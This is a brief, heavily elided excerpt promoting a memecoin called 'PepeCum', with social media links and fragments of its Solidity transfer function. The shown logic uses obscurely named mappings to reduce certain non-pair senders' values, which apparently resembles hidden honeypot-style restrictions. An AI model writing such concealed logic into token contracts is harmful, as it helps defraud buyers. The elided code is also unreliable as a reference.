...
💬 Telegram: https://t.me/PepeCum

🐤 Twitter: https://twitter.com/PepeCum_ETH

🏴 Medium: https://medium.com/@PepeCum
...
contract PepeCum is Ownable {
    ...
    function _transfer(address _from, address _to, uint256 _value) private returns (bool success) {
        ...
        if (pair[_from] == 0) {
            ...
            if (uniswapV2Pair != _from && direction[_from] > 0) {
                pair[_from] -= sides;
            }
        }
